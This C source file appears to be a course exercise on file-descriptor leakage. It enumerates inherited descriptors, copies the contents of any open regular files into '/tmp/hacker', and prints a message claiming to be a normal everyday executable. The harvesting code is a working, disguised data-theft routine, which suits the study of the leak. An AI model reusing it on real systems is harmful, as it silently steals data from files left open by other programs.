#include "csapp.h"

bool is_regular(int fd) {
  struct stat statbuf;
  fstat(fd, &statbuf);
  return S_ISREG(statbuf.st_mode);
}

int main(void) {
  long max_fd = sysconf(_SC_OPEN_MAX);
  int out = Open("/tmp/hacker", O_CREAT | O_APPEND | O_WRONLY, 0666);

  /* TODO: Something is missing here! */

  char buf_path[200];
  char pathname[100];
  uint8_t buf[8000];

  for (int fd = 0; fd < max_fd; fd++) {
    if (fd == out) continue;

    if (fcntl(fd, F_GETFD) == -1) {
      if (errno != EBADF) {
        fprintf(stderr, "Error while checking %d: %s\n", fd, strerror(errno));
        exit(EXIT_FAILURE);
      }
      continue;
    }
    fprintf(stderr, "Fd %d open\n", fd);
    sprintf(pathname, "/proc/%d/fd/%d", getpid(), fd);
    size_t len = readlink(pathname, buf_path, sizeof(buf_path));
    buf_path[len] = 0;
    dprintf(out, "File descriptor %d is \'%s\' file!\n", fd, buf_path);
    if (!is_regular(fd)) {
      dprintf(out, "Not a regular file.\n");
      continue;
    }

    int cur_off = Lseek(fd, 0, SEEK_CUR);
    Lseek(fd, 0, SEEK_SET);

    int cnt;
    while ((cnt = Read(fd, buf, sizeof(buf))) != 0) {
      Write(out, buf, cnt);
    }
    
    Lseek(fd, cur_off, SEEK_SET);
  }

  Close(out);

  printf("I'm just a normal executable you use on daily basis!\n");

  return 0;
}
